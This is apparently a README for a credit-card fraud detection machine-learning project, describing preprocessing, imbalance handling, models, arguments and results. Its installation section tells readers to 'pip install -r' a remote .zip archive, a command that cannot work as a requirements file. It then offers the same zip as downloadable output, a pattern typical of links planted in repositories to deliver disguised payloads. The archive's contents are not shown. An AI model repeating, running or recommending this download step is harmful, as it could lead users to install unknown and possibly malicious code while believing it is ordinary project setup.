# ğŸ“˜ Credit Card Fraud Detection

A complete machine-learning pipeline for detecting fraudulent transactions in highly imbalanced credit-card datasets.

This project walks through end-to-end ML development, including EDA, preprocessing, imbalance handling, model training, hyperparameter tuning, and evaluation using industry-recommended metrics for imbalanced classification.

## ğŸ“Œ Project Overview

Credit-card fraud detection is a binary classification problem where fraudulent transactions represent less than 0.2% of all records.
This project implements a clean, modular, and scalable ML workflow, including:

## âœ” What the project covers

Exploratory Data Analysis (EDA)

Data preprocessing: scaling, outlier handling, feature engineering

Imbalance handling techniques:

SMOTE

SMOTEENN

RandomUnderSampler

Class Weighting

Modeling:

Logistic Regression

Random Forest

MLP Neural Network

Voting Classifier

Hyperparameter tuning with GridSearchCV

Evaluation using robust, imbalance-friendly metrics (F1, AP)

Saving trained models & metrics

Configurable training via command-line arguments

## ğŸ“‚ Project Structure
<pre>
Credit-Card-Fraud-Detection/
â”‚
â”œâ”€â”€ Data/
â”‚   â”œâ”€â”€ newtrain.csv      # training set
â”‚   â”œâ”€â”€ val.csv           # validation set
â”‚   â””â”€â”€ test.csv          # testing set
â”‚
â”œâ”€â”€ EDA/
â”‚   â””â”€â”€ EDA.ipynb         # Exploratory Data Analysis
â”‚
â”œâ”€â”€ credit_fraud_train.py         # main training pipeline
â”œâ”€â”€ credit_fraud_utils_data.py    # preprocessing,evaluation utilities
â”œâ”€â”€ credit_fraud_test.py          # inference & evaluation on the test set
â”‚
â”œâ”€â”€ requirements.txt
â”œâ”€â”€ README.md
â””â”€â”€ Results/                      # model summary & best model outputs
</pre>
## ğŸ“¥ Dataset

This project uses the Credit Card Fraud Detection Dataset (2013) containing:

284,807 transactions

492 fraudulent transactions (0.17%)

Features:

Time

Amount

28 PCA-transformed components (V1â€“V28)

Target:

Class = 0 â†’ normal

Class = 1 â†’ fraud

The PCA transformation preserves confidentiality while keeping predictive signal.

## Results
F1-Score: 0.8317
average_precision: 0.8406882510305027
On Test Set  
## ğŸ›  Installation
  
1ï¸âƒ£ Create a virtual environment
python -m venv venv


Mac/Linux:

source venv/bin/activate


Windows:

venv\Scripts\activate

2ï¸âƒ£ Install dependencies
pip install -r requirements.txt


Or install directly from GitHub zipped requirements:

pip install -r https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip

ğŸš€ Running the Training Pipeline
  
â–¶ Final Model Training Command (Recommended)
python credit_fraud_train.py --model RandomForest --scaler StandardScaler --train 'data/newtrain.csv' --val 'data/val.csv'

â–¶ Try other configurations

The pipeline is fully configurable.

âš™ï¸ Command-Line Arguments
Argument	Description
--model	LogisticRegression / RandomForest / NeuralNetwork / VotingClassifier
--scaler	StandardScaler / MinMaxScaler / RobustScaler / None
--train	Path to training CSV
--val	Path to validation CSV
--gridsearch	Enable GridSearchCV
--sampling	SMOTE / SMOTEENN / UnderSampler / None
--factor	Sampling factor for SMOTE
--outliers_features	List of feature names for outlier removal
--outliers_factor	Controls aggressiveness of outlier deletion
## ğŸ“Š Evaluation Metrics

Due to extreme imbalance, accuracy is useless.
Instead, the project uses metrics designed for rare-event classification:

F1-Score

Average Precision (AP)

Precision-Recall curves

Confusion Matrix

Stratified K-Fold CV for stability

## ğŸ§  Machine Learning Models
  
ğŸ”¹ Logistic Regression

Strong linear baseline

Supports class weighting

Fast to train, interpretable

ğŸ”¹ Random Forest (â­ Best Overall Model)

Excellent for tabular data

Captures non-linear patterns

Robust to outliers

Produced the best F1/AP scores in our experiments

ğŸ”¹ Neural Network (MLP)

MLPClassifier from sklearn

Tunable via GridSearchCV

Good performance, but tuning requires more time

ğŸ”¹ Voting Classifier

Combines LR + RF + NN

Supports soft voting

Competitive performance

## âš– Handling Class Imbalance

Supported methods:

SMOTE: synthetic oversampling

SMOTEENN: oversampling + noise removal

Random Under-Sampling

Class Weighting inside models

ğŸ›‘ All sampling occurs inside CV folds to avoid data leakage.

## ğŸ“ Output Files

After training, the pipeline generates:

Trained model (.pkl)

Scaler (.pkl)

Metrics JSON

Predictions CSV

Best threshold & configs

Download the full packaged output:
ğŸ”— https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip

ğŸ§© Future Improvements

Deploy a FastAPI realtime inference service

Add threshold optimization for maximizing recall

Experiment with LightGBM / XGBoost

